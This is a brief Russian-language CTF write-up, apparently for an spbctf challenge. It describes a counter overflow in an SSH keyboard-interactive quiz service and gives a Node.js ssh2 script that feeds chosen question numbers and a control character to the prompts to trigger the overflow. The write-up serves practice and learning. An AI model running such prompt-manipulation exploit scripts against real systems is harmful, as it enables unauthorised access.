Принимает вопрос номер 4.

В ответ можно указывать любой символ.

В зависимости от номера вопроса происходило переполнение счетчика.

В зависимости от кода символа тоже было переполнение.

При вооде 4 в 34 запрос (Вроде выбор вопрос 17) было наиболее близкое число.

Далее символами в ответ задавали смещение.

PS: Судя по первому взляду правильных ответов не было, так как там рядом был рандом

```js
const { Client } = require('ssh2');
const conn = new Client();

let i = 0;
conn.on('ready', () => {
  console.log('Client :: ready');
  conn.exec('i love memes', (err, stream) => {
    if (err) throw err;
    stream.on('close', (code, signal) => {
      console.log('Stream :: close :: code: ' + code + ', signal: ' + signal);
      conn.end();
    }).on('data', (data) => {
      console.log('STDOUT: ' + data);
    }).stderr.on('data', (data) => {
      console.log('STDERR: ' + data);
    });
  });
}).on('keyboard-interactive', (name, instructions, instructionsLang, prompts, finish) => {
  const prompt = ((prompts && prompts[0]) ? prompts[0].prompt : '').split('\n')[0];
  i++;
  console.log(i, prompt);

  if (/Password/.test(prompt)) return finish([''])

  if (/question/.test(prompt) && i === 34) return finish(['4'])
  // 52

  if (/question/.test(prompt)) return finish(['1'])

  // Подбор
  if (/answer/.test(prompt)) return finish([`\u0018`]);
}).on('disconnect', (...data) => {
  console.log('disconnect', data);
}).on('error', (...data) => {
  console.log('error', data);
}).on('data', (...data) => {
  console.log('data', data);
}).connect({
  host: 't-darkshelf-7yhdavxe.spbctf.net',
  port: 22,
  username: 'grrm0e2714797f',
  type: 'keyboard-interactive',
  tryKeyboard: true
});
```
